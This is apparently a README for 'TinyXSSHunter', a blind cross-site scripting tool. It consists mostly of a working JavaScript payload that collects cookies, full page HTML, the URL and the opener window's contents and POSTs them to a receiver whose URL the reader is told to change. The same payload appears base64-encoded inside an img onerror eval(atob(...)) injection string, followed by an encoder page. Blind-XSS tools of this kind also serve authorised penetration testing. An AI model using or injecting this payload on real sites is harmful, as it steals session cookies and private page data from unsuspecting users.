# TinyXSSHunter
Note: url in below code needs to be changed. Receiver is just a very simple Java web application.

javascript code:

(function(){if(window.name!=='__'){try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS('http://www.w3.org/1999/xhtml','input');var body=document.getElementsByTagName('body')[0];__.setAttribute('value',escape(dcoo+'\r\n\r\n'+inne+'\r\n\r\n'+durl+'\r\n\r\n'+oloc+'\r\n\r\n'+oloh+'\r\n\r\n'+odoc));fetch('http://localhost:8080/Receiver/r',{method:'POST',body:__.getAttribute('value')})}else{window.name=''}})();

formated javascript code, change \ to \\\\ and ' to \\': 

(function(){if(window.name!==\'__\'){try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS(\'http://www.w3.org/1999/xhtml\',\'input\');var body=document.getElementsByTagName(\'body\')[0];__.setAttribute(\'value\',escape(dcoo+\'\\r\\n\\r\\n\'+inne+\'\\r\\n\\r\\n\'+durl+\'\\r\\n\\r\\n\'+oloc+\'\\r\\n\\r\\n\'+oloh+\'\\r\\n\\r\\n\'+odoc));fetch(\'http://localhost:8080/Receiver/r\',{method:\'POST\',body:__.getAttribute(\'value\')})}else{window.name=\'\'}})();

Encoded:

KGZ1bmN0aW9uKCl7aWYod2luZG93Lm5hbWUhPT0nX18nKXt0cnl7ZGNvbz1kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7ZGNvbz1udWxsfXRyeXtpbm5lPWRvY3VtZW50LmJvZHkucGFyZW50Tm9kZS5pbm5lckhUTUx9Y2F0Y2goZSl7aW5uZT1udWxsfXRyeXtkdXJsPWRvY3VtZW50LlVSTH1jYXRjaChlKXtkdXJsPW51bGx9dHJ5e29sb2M9b3BlbmVyLmxvY2F0aW9ufWNhdGNoKGUpe29sb2M9bnVsbH10cnl7b2xvaD1vcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUx9Y2F0Y2goZSl7b2xvaD1udWxsfXRyeXtvZG9jPW9wZW5lci5kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7b2RvYz1udWxsfXZhciBfXz1kb2N1bWVudC5jcmVhdGVFbGVtZW50TlMoJ2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwnLCdpbnB1dCcpO3ZhciBib2R5PWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF07X18uc2V0QXR0cmlidXRlKCd2YWx1ZScsZXNjYXBlKGRjb28rJ1xyXG5cclxuJytpbm5lKydcclxuXHJcbicrZHVybCsnXHJcblxyXG4nK29sb2MrJ1xyXG5cclxuJytvbG9oKydcclxuXHJcbicrb2RvYykpO2ZldGNoKCdodHRwOi8vbG9jYWxob3N0OjgwODAvUmVjZWl2ZXIvcicse21ldGhvZDonUE9TVCcsYm9keTpfXy5nZXRBdHRyaWJ1dGUoJ3ZhbHVlJyl9KX1lbHNle3dpbmRvdy5uYW1lPScnfX0pKCk7

Final payload:

<img id=KGZ1bmN0aW9uKCl7aWYod2luZG93Lm5hbWUhPT0nX18nKXt0cnl7ZGNvbz1kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7ZGNvbz1udWxsfXRyeXtpbm5lPWRvY3VtZW50LmJvZHkucGFyZW50Tm9kZS5pbm5lckhUTUx9Y2F0Y2goZSl7aW5uZT1udWxsfXRyeXtkdXJsPWRvY3VtZW50LlVSTH1jYXRjaChlKXtkdXJsPW51bGx9dHJ5e29sb2M9b3BlbmVyLmxvY2F0aW9ufWNhdGNoKGUpe29sb2M9bnVsbH10cnl7b2xvaD1vcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUx9Y2F0Y2goZSl7b2xvaD1udWxsfXRyeXtvZG9jPW9wZW5lci5kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7b2RvYz1udWxsfXZhciBfXz1kb2N1bWVudC5jcmVhdGVFbGVtZW50TlMoJ2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwnLCdpbnB1dCcpO3ZhciBib2R5PWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF07X18uc2V0QXR0cmlidXRlKCd2YWx1ZScsZXNjYXBlKGRjb28rJ1xyXG5cclxuJytpbm5lKydcclxuXHJcbicrZHVybCsnXHJcblxyXG4nK29sb2MrJ1xyXG5cclxuJytvbG9oKydcclxuXHJcbicrb2RvYykpO2ZldGNoKCdodHRwOi8vbG9jYWxob3N0OjgwODAvUmVjZWl2ZXIvcicse21ldGhvZDonUE9TVCcsYm9keTpfXy5nZXRBdHRyaWJ1dGUoJ3ZhbHVlJyl9KX1lbHNle3dpbmRvdy5uYW1lPScnfX0pKCk7 src=x onerror=eval(atob(this.id))>

Encoder:

<!DOCTYPE html>
<html>
<body>
<p>Click the button to decode a base-64 encoded string.</p>
<button onclick="myFunction()">Try it</button>
<p><strong>Note:</strong> The atob() method is not supported in IE9 and earlier.</p>
<p id="demo"></p>
<script>
function myFunction() {
    var str = "(function(){if(window.name!==\'__\'){try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS(\'http://www.w3.org/1999/xhtml\',\'input\');var body=document.getElementsByTagName(\'body\')[0];__.setAttribute(\'value\',escape(dcoo+\'\\r\\n\\r\\n\'+inne+\'\\r\\n\\r\\n\'+durl+\'\\r\\n\\r\\n\'+oloc+\'\\r\\n\\r\\n\'+oloh+\'\\r\\n\\r\\n\'+odoc));fetch(\'http://localhost:8080/Receiver/r\',{method:\'POST\',body:__.getAttribute(\'value\')})}else{window.name=\'\'}})();";
    var enc = window.btoa(str);
    var dec = window.atob(enc);

    var res = "Encoded String: " + enc + "<br>" + "Decoded String: " + dec;
    document.getElementById("demo").innerHTML = res;
}
</script>
</body>
</html>

Thanks to:

https://ardern.io/2017/12/10/blind-xss/
